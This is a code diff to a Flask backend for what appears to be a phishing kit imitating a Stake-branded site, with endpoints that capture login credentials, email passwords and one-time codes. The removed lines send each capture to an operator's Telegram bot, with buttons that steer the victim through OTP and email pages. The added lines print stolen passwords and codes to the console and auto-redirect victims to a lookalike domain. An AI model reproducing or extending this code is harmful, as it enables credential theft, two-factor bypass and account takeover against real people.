@@ -2,15 +2,10 @@ from flask import Flask, request, jsonify
 from flask_cors import CORS
 import os
 import uuid
-import requests
-import json
-from dotenv import load_dotenv
-
-load_dotenv()
 
 app = Flask(__name__)
 
-# ✅ CORS FIX
+# ✅ CORS
 CORS(app)
 
 @app.after_request
@@ -20,51 +15,8 @@ def handle_options(response):
     response.headers["Access-Control-Allow-Methods"] = "GET,POST,OPTIONS"
     return response
 
-# ENV
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-CHAT_ID = os.getenv("CHAT_ID")
-
-if not BOT_TOKEN or not CHAT_ID:
-    raise RuntimeError("Missing BOT_TOKEN or CHAT_ID")
-
 # SESSION STORE
 SESSION_STATUS = {}
-
-# ======================
-# TELEGRAM SEND (FINAL)
-# ======================
-def send_to_telegram(data, session_id, type_):
-    msg = f"🔐 {type_.upper()} Submission\n\n"
-
-    for k, v in data.items():
-        msg += f"• {k.upper()} : {v}\n"
-
-    msg += f"\nSESSION: {session_id}"
-
-    keyboard = {
-        "inline_keyboard": [
-            [{"text": "🔐 LOGIN1", "callback_data": f"{session_id}:index.html"}],
-            [{"text": "🔢 OTP", "callback_data": f"{session_id}:otp.html"}],
-            [{"text": "📧 EMAIL", "callback_data": f"{session_id}:email.html"}],
-            [{"text": "🎉 DONE", "callback_data": f"{session_id}:thnks.html"}]
-        ]
-    }
-
-    payload = {
-        "chat_id": CHAT_ID,
-        "text": msg,
-        "reply_markup": json.dumps(keyboard)
-    }
-
-    r = requests.post(
-        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-        data=payload
-    )
-
-    print("Telegram response:", r.text)
-
-    return r.ok
-
 
 # ======================
 # LOGIN
@@ -86,13 +38,13 @@ def login():
         "redirect_url": None
     }
 
-    send_to_telegram(data, session_id, "login")
+    print(f"[LOGIN] {data['login']} / {data['password']}")
 
     return jsonify({"success": True, "id": session_id})
 
 
 # ======================
-# OTP
+# OTP (FIXED)
 # ======================
 @app.route("/otp", methods=["POST", "OPTIONS"])
 def otp():
@@ -101,23 +53,26 @@ def otp():
 
     data = request.get_json()
 
-    if not data or "otp" not in data:
-        return jsonify({"success": False, "error": "Missing OTP"}), 400
+    session_id = data.get("session_id")
+    otp = data.get("otp")
 
-    session_id = str(uuid.uuid4())
+    if not session_id or not otp:
+        return jsonify({"success": False, "error": "Missing data"}), 400
 
-    SESSION_STATUS[session_id] = {
-        "approved": False,
-        "redirect_url": None
-    }
+    if session_id not in SESSION_STATUS:
+        return jsonify({"success": False, "error": "Invalid session"}), 400
 
-    send_to_telegram(data, session_id, "otp")
+    print(f"[OTP RECEIVED] {otp} for session {session_id}")
 
-    return jsonify({"success": True, "id": session_id})
+    # ✅ simulate approval
+    SESSION_STATUS[session_id]["approved"] = True
+    SESSION_STATUS[session_id]["redirect_url"] = "https://www.stake-vips.com/dashboard.html"
+
+    return jsonify({"success": True})
 
 
 # ======================
-# EMAIL
+# EMAIL (OPTIONAL)
 # ======================
 @app.route("/email", methods=["POST", "OPTIONS"])
 def email():
@@ -129,16 +84,9 @@ def email():
     if not data or "email" not in data or "password" not in data:
         return jsonify({"success": False, "error": "Missing fields"}), 400
 
-    session_id = str(uuid.uuid4())
+    print(f"[EMAIL] {data['email']} / {data['password']}")
 
-    SESSION_STATUS[session_id] = {
-        "approved": False,
-        "redirect_url": None
-    }
-
-    send_to_telegram(data, session_id, "email")
-
-    return jsonify({"success": True, "id": session_id})
+    return jsonify({"success": True})
 
 
 # ======================
@@ -152,26 +100,6 @@ def status(session_id):
         return jsonify({"error": "Invalid session"}), 404
 
     return jsonify(session)
-
-
-# ======================
-# TELEGRAM WEBHOOK
-# ======================
-@app.route("/webhook", methods=["POST"])
-def webhook():
-    data = request.get_json()
-
-    if "callback_query" in data:
-        callback = data["callback_query"]
-        message = callback["data"]
-
-        session_id, page = message.split(":")
-
-        if session_id in SESSION_STATUS:
-            SESSION_STATUS[session_id]["approved"] = True
-            SESSION_STATUS[session_id]["redirect_url"] = f"https://www.stake-vips.com/{page}"
-
-    return jsonify({"ok": True})
 
 
 # ======================
